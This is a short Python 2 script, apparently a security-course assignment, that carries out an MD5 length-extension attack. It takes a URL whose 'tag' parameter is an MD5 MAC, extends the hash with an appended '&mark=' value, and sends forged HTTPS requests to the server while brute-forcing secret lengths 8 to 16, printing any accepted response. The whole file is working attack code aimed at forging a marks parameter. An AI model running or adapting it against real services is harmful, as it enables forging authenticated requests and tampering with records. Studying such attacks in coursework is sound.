import httplib, urlparse, urllib, sys
from md5p import md5, padding

# Take command line arguments into variables
url = sys.argv[1]
mark = sys.argv[2]

# ADD CODE HERE
# Parsed the url into myParsed
myParsed = urlparse.urlparse(url)

# Obtained the query from myParsed and put them into dictionary
# with title as the key {"tag": "..", "stnum": "##########", etc}
query = myParsed.query
queryDict = dict(s.split("=") for s in query.split("&"))

#Update the hash with the marked query and new tag
h = md5(state=queryDict["tag"].decode("hex"), count=512)
markQuery = "&mark=" + str(mark)
h.update(markQuery)

# Store URL Params starting from the first '&' in a variable
URL_params = query[query.find("&"):]

# Compute the hash of new tag, marks and ith padding on each iteration
for i in range(8, 16+1):
    url = myParsed.scheme + "://" + myParsed.netloc  + \
    myParsed.path + "?tag=" + str(h.hexdigest()) + URL_params + \
    urllib.quote(padding((len(URL_params) + i)* 8)) + markQuery

    # parameter url is the attack url you construct 
    parsedURL = urlparse.urlparse(url)
    
    # open a connection to the server
    
    httpconn = httplib.HTTPSConnection(parsedURL.hostname)
    
    # issue server-API request
    httpconn.request("GET", parsedURL.path + "?" + parsedURL.query)
    
    # httpresp is response object containing a status value and possible message
    httpresp = httpconn.getresponse()
    # Only print request and server message when the server is working
    if httpresp.status == 200:
        # valid request will result in httpresp.status value 200
        print httpresp.status
        # in the case of a valid request, print the server's message
        print httpresp.read()
